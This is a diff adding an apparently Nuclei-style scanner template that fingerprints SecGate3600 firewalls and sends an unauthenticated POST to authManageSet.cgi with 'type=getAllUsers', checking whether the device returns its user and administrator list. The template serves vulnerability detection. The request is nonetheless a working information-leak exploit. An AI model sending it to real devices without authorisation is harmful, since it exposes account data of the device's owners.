@@ -1,0 +1,45 @@
+id: secgate3600-authmanageset-cgi-info-leak
+
+info:
+  name: SecGate3600 authManageSet.cgi Information Leak
+  author: ProjectDiscoveryAI
+  severity: medium
+  tags: info-leak
+
+variables:
+  t1: "{{gbk_encode('管理员')}}"
+
+http:
+  - method: GET
+    path:
+      - "{{BaseURL}}/"
+    matchers-condition: and
+    matchers:
+      - type: dsl
+        dsl:
+          - "status_code == 200"
+      - type: word
+        words:
+          - "sec_gate_image/login_02.gif"
+        part: body
+
+  - method: POST
+    path:
+      - "{{BaseURL}}/cgi-bin/authUser/authManageSet.cgi"
+    headers:
+      Content-Type: application/x-www-form-urlencoded
+    body: "type=getAllUsers&_search=false&nd=1645000391264&rows=-1&page=1&sidx=&sord=asc"
+    matchers-condition: and
+    matchers:
+      - type: dsl
+        dsl:
+          - "status_code == 200"
+      - type: word
+        words:
+          - "rows"
+          - "{{t1}}"
+        part: body
+      - type: word
+        words:
+          - "text/xml"
+        part: header
